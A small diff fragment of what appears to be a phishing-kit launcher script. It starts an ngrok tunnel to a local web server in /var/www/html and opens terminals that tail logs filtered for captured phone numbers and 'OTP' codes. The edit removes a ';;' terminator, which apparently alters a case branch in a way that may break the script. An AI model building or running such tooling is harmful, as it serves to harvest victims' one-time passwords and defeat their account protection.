@@ -65,6 +65,5 @@ yellow='\e[1;33m'
                 gnome-terminal -x bash -c "./ngrok http 80; exec bash"
                 cd /var/www/html/
 		gnome-terminal -x bash -c "tail -f log.txt | grep -e "number"; exec bash"
-                gnome-terminal -x bash -c "tail -f logs.txt | grep -e "OTP" -e "otp"; exec bash"
-		;;
+                gnome-terminal -x bash -c "tail -f logs.txt | grep -e "OTP" -e "otp"; exec bash";
 	        
